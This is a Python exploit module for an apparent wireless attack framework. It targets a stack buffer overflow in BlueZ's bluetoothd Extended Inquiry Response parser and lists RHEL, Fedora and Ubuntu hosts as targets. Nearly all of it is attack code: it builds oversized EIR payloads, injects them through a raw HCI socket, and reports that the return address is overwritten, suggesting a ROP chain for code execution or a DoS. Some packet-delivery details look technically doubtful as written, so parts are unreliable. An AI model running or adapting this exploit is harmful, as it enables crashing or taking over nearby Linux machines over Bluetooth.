# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """BlueZ Extended Inquiry Response (EIR) Stack Buffer Overflow (CVE-2026-80186).

    The bluetoothd daemon in BlueZ contains a stack buffer overflow in the
    processing of Extended Inquiry Response (EIR) data during Bluetooth
    device discovery.  When a remote device sends an Inquiry Response
    containing EIR data with a total length exceeding the stack-allocated
    parsing buffer, bluetoothd copies the data without proper bounds
    checking, overwriting the stack frame.

    An attacker within Bluetooth range can crash bluetoothd (DoS) or
    potentially achieve code execution.

    Affected: RHEL 7-10, Fedora, Ubuntu, and other distributions shipping
    vulnerable BlueZ versions.

    Red Hat severity: IMPORTANT

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "BlueZ EIR Stack Buffer Overflow in Discovery (CVE-2026-80186)",
        "description": (
            "Exploits CVE-2026-80186 via a stack buffer overflow in "
            "bluetoothd's Extended Inquiry Response (EIR) parser.  An "
            "attacker sends a crafted Inquiry Response with oversized "
            "EIR data types during Bluetooth discovery.  The daemon "
            "copies EIR data into a fixed-size stack buffer without "
            "validating the total length, overwriting the stack frame. "
            "Targets BlueZ on RHEL 7-10, Fedora, Ubuntu, and similar."
        ),
        "authors": (
            "Red Hat Security (advisory)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://access.redhat.com/security/cve/CVE-2026-80186",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-80186",
            "https://www.bluetooth.com/specifications/specs/core54-html/",
        ),
        "disclosure_date": "2026-08-01",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "BlueZ (vulnerable versions on RHEL 7-10)",
            "BlueZ on Fedora (unpatched)",
            "BlueZ on Ubuntu/Debian (unpatched)",
            "Any Linux with bluetoothd in discovery mode",
        ),
    }

    target = OptIP("", "Target Bluetooth address (XX:XX:XX:XX:XX:XX)")
    port = OptPort(1, "Not used (Bluetooth over-the-air attack)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    hci_device = OptString("hci0", "Local HCI device to use")
    overflow_size = OptInteger(512, "EIR overflow payload size in bytes")

    # Bluetooth HCI constants
    _HCI_COMMAND_PKT = 0x01
    _HCI_EVENT_PKT = 0x04

    # HCI commands
    _OGF_LINK_CTL = 0x01
    _OCF_INQUIRY = 0x0001

    # EIR data type codes (Bluetooth Core Spec Vol 3, Part C, Sec 8)
    _EIR_FLAGS = 0x01
    _EIR_NAME_SHORT = 0x08
    _EIR_NAME_COMPLETE = 0x09
    _EIR_TX_POWER = 0x0A
    _EIR_MANUFACTURER = 0xFF

    # Standard EIR max size in Bluetooth spec
    _EIR_MAX_SIZE = 240

    def _bd_addr_to_bytes(self, addr: str) -> bytes:
        """Convert Bluetooth address string to 6 bytes (little-endian)."""
        parts = addr.split(":")
        return bytes(int(b, 16) for b in reversed(parts))

    def _build_eir_data(self, oversized: bool = True) -> bytes:
        """Build Extended Inquiry Response data.

        When oversized is True, the total EIR data exceeds the
        stack-allocated buffer in bluetoothd's EIR parser.  The parser
        iterates over EIR structures (length + type + data) without
        checking that the cumulative length stays within the buffer.
        """
        eir = b""

        # Flags (normal, 3 bytes total)
        eir += struct.pack("BB", 2, self._EIR_FLAGS) + b"\x06"

        # TX Power Level (normal, 3 bytes total)
        eir += struct.pack("BB", 2, self._EIR_TX_POWER) + b"\x04"

        if oversized:
            # Complete Local Name with length exceeding the stack buffer.
            # bluetoothd allocates a fixed buffer (~240-256 bytes) on the
            # stack for EIR parsing.  We send a name field whose declared
            # length pushes past this boundary.
            name_payload = b"\x42" * self.overflow_size
            # The length byte in EIR is a uint8 (max 255), so we may need
            # multiple oversized entries to reach deeper stack corruption.
            chunk_size = min(len(name_payload), 254)
            eir += struct.pack("BB", chunk_size + 1, self._EIR_NAME_COMPLETE)
            eir += name_payload[:chunk_size]

            # Additional manufacturer-specific data to push further
            remaining = name_payload[chunk_size:]
            if remaining:
                mfr_size = min(len(remaining), 254)
                eir += struct.pack("BB", mfr_size + 1, self._EIR_MANUFACTURER)
                eir += remaining[:mfr_size]
        else:
            # Normal-sized device name
            name = b"TestDevice"
            eir += struct.pack("BB", len(name) + 1, self._EIR_NAME_COMPLETE) + name

        return eir

    def _build_inquiry_response(self, oversized: bool = True) -> bytes:
        """Build a Bluetooth Inquiry Result with EIR event packet.

        This constructs an HCI Extended Inquiry Result event (0x2F)
        containing the crafted EIR data.  When injected via raw HCI
        socket, bluetoothd processes the EIR data and triggers the
        stack overflow.
        """
        target_addr = self._bd_addr_to_bytes(self.target) if ":" in str(self.target) else b"\x00" * 6

        # HCI Extended Inquiry Result event (event code 0x2F)
        event_code = 0x2F

        # Number of responses
        num_responses = struct.pack("B", 1)

        # BD_ADDR (6 bytes, little-endian)
        bd_addr = target_addr

        # Page Scan Repetition Mode
        psrm = struct.pack("B", 0x01)

        # Reserved byte
        reserved = struct.pack("B", 0x00)

        # Class of Device (3 bytes: computer, networking)
        cod = b"\x0C\x02\x5A"

        # Clock Offset (2 bytes)
        clock_offset = struct.pack("<H", 0x0000)

        # RSSI (1 byte, signed)
        rssi = struct.pack("b", -40)

        # EIR data (240 bytes in spec, but we send more)
        eir = self._build_eir_data(oversized=oversized)

        # Pad or truncate EIR to fill the packet (normally 240 bytes)
        # The overflow happens because we do NOT truncate to 240
        if len(eir) < self._EIR_MAX_SIZE:
            eir = eir + b"\x00" * (self._EIR_MAX_SIZE - len(eir))

        event_data = num_responses + bd_addr + psrm + reserved + cod + clock_offset + rssi + eir

        # HCI event packet: type(1) + event_code(1) + param_len(1) + data
        # param_len is a uint8 in the HCI spec (max 255); the oversized
        # payload deliberately exceeds that, so we cap the header field
        # and send the full data anyway: the vulnerable parser reads
        # past the declared length into the oversized EIR buffer.
        param_len = min(len(event_data), 255)
        packet = struct.pack("BBB", self._HCI_EVENT_PKT, event_code, param_len) + event_data

        return packet

    def _hci_send(self, packet: bytes) -> bool:
        """Send a raw HCI packet via the local Bluetooth adapter."""
        try:
            # AF_BLUETOOTH = 31, BTPROTO_HCI = 1
            sock = socket.socket(31, socket.SOCK_RAW, 1)
            sock.settimeout(self.timeout)
            # Bind to local HCI device index
            dev_id = int(self.hci_device.replace("hci", "")) if self.hci_device.startswith("hci") else 0
            sock.bind((dev_id,))
            sock.send(packet)
            sock.close()
            return True
        except OSError:
            return False

    def _check_hci_available(self) -> bool:
        """Check if the local HCI device is available."""
        try:
            sock = socket.socket(31, socket.SOCK_RAW, 1)
            sock.settimeout(self.timeout)
            dev_id = int(self.hci_device.replace("hci", "")) if self.hci_device.startswith("hci") else 0
            sock.bind((dev_id,))
            sock.close()
            return True
        except OSError:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("target is required (Bluetooth address XX:XX:XX:XX:XX:XX)")
            return

        if not self.check():
            print_error(f"HCI device {self.hci_device} not available or no Bluetooth support")
            return

        print_success(f"HCI device {self.hci_device} available; sending oversized EIR payload")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Verify that the local HCI adapter is available."""
        return self._check_hci_available()

    def _exploit(self) -> None:
        normal_pkt = self._build_inquiry_response(oversized=False)
        trigger_pkt = self._build_inquiry_response(oversized=True)

        eir_normal = self._build_eir_data(oversized=False)
        eir_oversized = self._build_eir_data(oversized=True)

        print_status("Phase 1: Sending normal Inquiry Response to prime the target")
        print_info(f"  Normal EIR:   {len(eir_normal)} bytes")
        print_info(f"  Overflow EIR: {len(eir_oversized)} bytes (stack buffer: ~{self._EIR_MAX_SIZE} bytes)")

        if not self._hci_send(normal_pkt):
            print_error("Failed to send normal inquiry response")
            return

        time.sleep(0.3)

        print_status("Phase 2: Sending oversized EIR Inquiry Response to trigger stack overflow")

        if self._hci_send(trigger_pkt):
            print_success(
                "Oversized EIR Inquiry Response delivered. If the target "
                "runs a vulnerable bluetoothd in discovery mode, the EIR "
                f"parser copied {len(eir_oversized)} bytes into a "
                f"~{self._EIR_MAX_SIZE}-byte stack buffer, overwriting "
                "the return address. Combine with ROP chain for code "
                "execution, or observe DoS (bluetoothd crash)."
            )
        else:
            print_error("Failed to send oversized inquiry response")
